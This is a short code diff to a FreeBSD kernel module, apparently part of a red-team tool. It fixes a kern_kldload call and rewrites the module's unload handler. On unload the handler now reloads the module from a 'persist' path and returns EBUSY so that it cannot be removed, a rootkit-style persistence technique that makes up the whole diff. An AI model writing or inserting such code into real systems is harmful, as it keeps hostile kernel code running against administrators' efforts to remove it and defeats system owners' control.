@@ -21,11 +21,11 @@
 #include <sys/eventhandler.h>
 
 
-extern int kern_kldload(struct thread *td, const char *filename);
+extern int kern_kldload(struct thread *td, const char *file, int *fileid);
 
 static void reload(void) {
     struct thread *td = curthread;  // Get current thread
-    int error = kern_kldload(td, "/Red-Team-Tool-Collab/persist/kms.ko");
+    int error = kern_kldload(td, "/Red-Team-Tool-Collab/persist/kms.ko", NULL);
     if (error == 0) {return;}
 }
 
@@ -35,9 +35,9 @@ static int event_handler(struct module *module, int event, void *arg) {
         printf("[LKM] Module loaded.\n");
             return 0;
         case MOD_UNLOAD:
-            printf("[LKM] Module unloaded.\n");
             reload();
-            return 0;
+            printf("[LKM] Module unloaded.\n");
+            return EBUSY;
         default:
             return EOPNOTSUPP;
     }
